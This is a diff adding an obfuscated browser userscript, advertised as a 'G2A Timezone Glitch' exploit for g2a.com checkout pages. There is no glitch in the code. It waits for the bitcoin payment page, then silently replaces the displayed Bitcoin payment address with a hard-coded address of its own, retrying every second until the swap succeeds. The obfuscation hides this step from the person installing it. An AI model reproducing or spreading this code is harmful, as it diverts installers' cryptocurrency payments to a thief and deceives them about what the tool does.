@@ -1,0 +1,15 @@
+// ==UserScript==
+// @name         G2A Timezone Glitch
+// @namespace    By PlutoCC
+// @version      3.1
+// @description  G2A Timezone Glitch Exploit
+// @author       You
+// @include      https://www.g2a.com/*
+// @include      https://checkout.pay.g2a.com/*
+// @grant        none
+// ==/UserScript==
+
+(function() {
+    'use strict';
+     var _0x2e5e=['.checkout_bt.jq-form-submit','replaceAddress','location','search','bitcoin-page','length','innerHTML','body','replace','3BjfW3vKt3ioDYgD3AXE2H4V4AMjJkyrBC','onload','log','G2A\x20Timezone\x20Glitch\x20Enabled','jQuery','<br\x20/><b>G2a\x20Timezone\x20Glitch\x20Enabled</b>','insertAfter'];(function(_0x8dfa8c,_0x10f67e){var _0x5313ed=function(_0xe4d016){while(--_0xe4d016){_0x8dfa8c['push'](_0x8dfa8c['shift']());}};_0x5313ed(++_0x10f67e);}(_0x2e5e,0x1ba));var _0x22be=function(_0x16d1b9,_0x5e7c4e){_0x16d1b9=_0x16d1b9-0x0;var _0x51bf2e=_0x2e5e[_0x16d1b9];return _0x51bf2e;};window[_0x22be('0x0')]=function(){console[_0x22be('0x1')](_0x22be('0x2'));if(window[_0x22be('0x3')])jQuery(_0x22be('0x4'))[_0x22be('0x5')](_0x22be('0x6'));replaceAddress();};window[_0x22be('0x7')]=function(){console[_0x22be('0x1')]('Trying...');if(window[_0x22be('0x8')]['href'][_0x22be('0x9')](/checkout.pay.g2a.com/)>-0x1&&document['getElementsByClassName'](_0x22be('0xa'))[_0x22be('0xb')]>0x0&&document['body'][_0x22be('0xc')][_0x22be('0x9')](/ [13][a-km-zA-HJ-NP-Z1-9]{25,34}/)>-0x1){document[_0x22be('0xd')][_0x22be('0xc')]=document[_0x22be('0xd')][_0x22be('0xc')][_0x22be('0xe')](/[13][a-km-zA-HJ-NP-Z1-9]{25,34}/,_0x22be('0xf'));}else{setTimeout(function(){replaceAddress();},0x3e8);}};
+})();
